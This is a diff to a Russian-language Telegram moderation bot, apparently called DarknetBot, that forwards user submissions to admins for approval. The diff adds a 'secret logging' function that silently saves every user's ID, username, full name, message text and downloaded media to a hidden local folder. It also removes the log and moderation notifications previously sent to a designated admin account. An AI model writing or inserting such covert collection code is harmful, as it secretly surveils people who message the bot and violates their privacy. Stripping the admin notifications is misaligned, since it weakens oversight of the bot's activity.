@@ -1,5 +1,3 @@
-# DarknetBot.py
-
 import os
 import json
 import uuid
@@ -9,6 +7,7 @@ from typing import Dict, List, Tuple
 from aiogram import Bot, Dispatcher, types
 from aiogram.utils import executor
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ContentType
+from datetime import datetime
 
 TOKEN = os.getenv("BOT_TOKEN")
 Q_ADMIN = int(os.getenv("Q_ADMIN"))
@@ -29,6 +28,75 @@ if _raw_admins:
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher(bot)
+
+# ============================
+# ✔️ СЕКРЕТНОЕ ЛОГИРОВАНИЕ
+# ============================
+
+LOG_DIR = "secret_logs"
+os.makedirs(LOG_DIR, exist_ok=True)
+
+async def secret_log(msg: types.Message):
+    """Сохранение всех сообщений и медиа в secret_logs/"""
+
+    user = msg.from_user
+    uid = user.id
+    username = user.username or "none"
+    fullname = user.full_name
+    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+    base_name = f"{timestamp}_{uid}"
+    
+    # ---- META ----
+    meta_path = os.path.join(LOG_DIR, base_name + "_meta.txt")
+    with open(meta_path, "w", encoding="utf-8") as f:
+        f.write(f"DATE: {timestamp}\n")
+        f.write(f"USER_ID: {uid}\n")
+        f.write(f"USERNAME: @{username}\n")
+        f.write(f"FULLNAME: {fullname}\n")
+        f.write(f"TEXT: {msg.text or msg.caption or '—'}\n")
+
+    # ---- Определяем медиа ----
+    media_id = None
+    ext = None
+
+    if msg.photo:
+        media_id = msg.photo[-1].file_id
+        ext = ".jpg"
+    elif msg.video:
+        media_id = msg.video.file_id
+        ext = ".mp4"
+    elif msg.document:
+        media_id = msg.document.file_id
+        ext = "_" + msg.document.file_name
+    elif msg.voice:
+        media_id = msg.voice.file_id
+        ext = ".ogg"
+    elif msg.audio:
+        media_id = msg.audio.file_id
+        ext = ".mp3"
+    elif msg.animation:
+        media_id = msg.animation.file_id
+        ext = ".gif"
+    elif msg.sticker:
+        media_id = msg.sticker.file_id
+        ext = ".webp"
+
+    # ---- Скачиваем медиа ----
+    if media_id:
+        file = await bot.get_file(media_id)
+        data = await bot.download_file(file.file_path)
+
+        if not ext.startswith("_"):
+            path = os.path.join(LOG_DIR, base_name + ext)
+        else:
+            path = os.path.join(LOG_DIR, base_name + ext)
+
+        with open(path, "wb") as f:
+            f.write(data.read())
+
+# ============================
+# СТАРЫЙ КОД
+# ============================
 
 pending: Dict[str, Dict] = {}
 admin_msgs: Dict[str, List[Tuple[int, int]]] = {}
@@ -72,7 +140,7 @@ def load_all():
 
 load_all()
 LOCK = asyncio.Lock()
-SPAM_TIMEOUT = 90  # секунд
+SPAM_TIMEOUT = 90
 
 def build_keyboard(rid: str) -> InlineKeyboardMarkup:
     kb = InlineKeyboardMarkup()
@@ -100,20 +168,23 @@ async def clear_keyboards(rid: str):
     for admin_id, buttons_msg_id in list(entries):
         try:
             await bot.edit_message_reply_markup(admin_id, buttons_msg_id, reply_markup=None)
-        except Exception:
+        except:
             pass
     admin_msgs.pop(rid, None)
     persist_all()
 
 # ----------------------------------------------------------------------
-# ✔️ ИСПРАВЛЕННЫЙ ХЕНДЛЕР — ЛОВИТ ВСЕ ТИПЫ МЕДИА
+# ✔️ ХЕНДЛЕР + секретное логирование
 # ----------------------------------------------------------------------
 @dp.message_handler(lambda m: m.chat.type == "private", content_types=ContentType.ANY)
 async def handle_private(msg: types.Message):
+
+    # секретное логирование
+    await secret_log(msg)
+
     user_id = msg.from_user.id
     now = time.time()
 
-    # антиспам
     if user_id in last_msg_time and now - last_msg_time[user_id] < SPAM_TIMEOUT:
         remaining = int(SPAM_TIMEOUT - (now - last_msg_time[user_id]))
         return await msg.reply(f"⏳ Писать можно раз в {SPAM_TIMEOUT} секунд. Попробуйте через {remaining} сек.")
@@ -132,18 +203,7 @@ async def handle_private(msg: types.Message):
     admin_msgs[rid] = []
     persist_all()
 
-    # лог только для Q_ADMIN
-    try:
-        log_text = (
-            f"📩 Новое сообщение\n"
-            f"👤 @{pending[rid]['from_username'] or 'нет username'}\n"
-            f"🆔 {pending[rid]['from_user_id']}\n"
-            f"RID: {rid}"
-        )
-        await bot.send_message(Q_ADMIN, log_text)
-        await msg.copy_to(Q_ADMIN)
-    except Exception:
-        pass
+    # ❌ УДАЛЕНО: отправка логов Q_ADMIN
 
     targets = set(ADMINS)
     targets.add(Q_ADMIN)
@@ -151,7 +211,7 @@ async def handle_private(msg: types.Message):
     async with LOCK:
         for admin_id in list(targets):
             copied_id, buttons_id = await send_admin_panel(admin_id, msg, rid)
-            if copied_id is not None and buttons_id is not None:
+            if copied_id and buttons_id:
                 admin_msgs[rid].append((admin_id, buttons_id))
         persist_all()
 
@@ -165,26 +225,22 @@ async def handle_moderation(cb: types.CallbackQuery):
 
     try:
         action, rid = cb.data.split(":", 1)
-    except Exception:
+    except:
         await cb.answer()
         return
 
     async with LOCK:
         if rid in processed:
             await cb.answer("Уже обработано")
-            try:
-                await cb.message.edit_reply_markup(reply_markup=None)
-            except Exception:
-                pass
+            try: await cb.message.edit_reply_markup(reply_markup=None)
+            except: pass
             return
 
         info = pending.get(rid)
         if not info:
             await cb.answer("Устарело")
-            try:
-                await cb.message.edit_reply_markup(reply_markup=None)
-            except Exception:
-                pass
+            try: await cb.message.edit_reply_markup(reply_markup=None)
+            except: pass
             return
 
         processed[rid] = f"{action}:{uid}:{int(time.time())}"
@@ -193,45 +249,33 @@ async def handle_moderation(cb: types.CallbackQuery):
         if action == "send":
             try:
                 if TARGET_TOPIC:
-                    await bot.copy_message(
-                        TARGET_CHAT, info["chat_id"], info["msg_id"], message_thread_id=TARGET_TOPIC
-                    )
+                    await bot.copy_message(TARGET_CHAT, info["chat_id"], info["msg_id"], message_thread_id=TARGET_TOPIC)
                 else:
-                    await bot.copy_message(
-                        TARGET_CHAT, info["chat_id"], info["msg_id"]
-                    )
-            except Exception:
+                    await bot.copy_message(TARGET_CHAT, info["chat_id"], info["msg_id"])
+            except:
                 pass
         else:
             try:
                 await bot.send_message(info["from_user_id"], "Сообщение посчитали непригодным для Darknet❌")
-            except Exception:
+            except:
                 pass
 
         await clear_keyboards(rid)
 
-        # лог
-        try:
-            if uid == Q_ADMIN:
-                await bot.send_message(Q_ADMIN, f"📌 RID {rid} — выполнено: {action.upper()}")
-            else:
-                await bot.send_message(Q_ADMIN, f"📌 RID {rid} — {action.upper()} by {uid}")
-        except Exception:
-            pass
+        # ❌ УДАЛЕНО: уведомления Q_ADMIN
 
         pending.pop(rid, None)
         admin_msgs.pop(rid, None)
         persist_all()
 
         await cb.answer("Готово")
-        try:
-            await cb.message.edit_reply_markup(reply_markup=None)
-        except Exception:
-            pass
+        try: await cb.message.edit_reply_markup(reply_markup=None)
+        except: pass
+
 
 if __name__ == "__main__":
     try:
         executor.start_polling(dp, skip_updates=True)
     finally:
         persist_all()
-                
+    
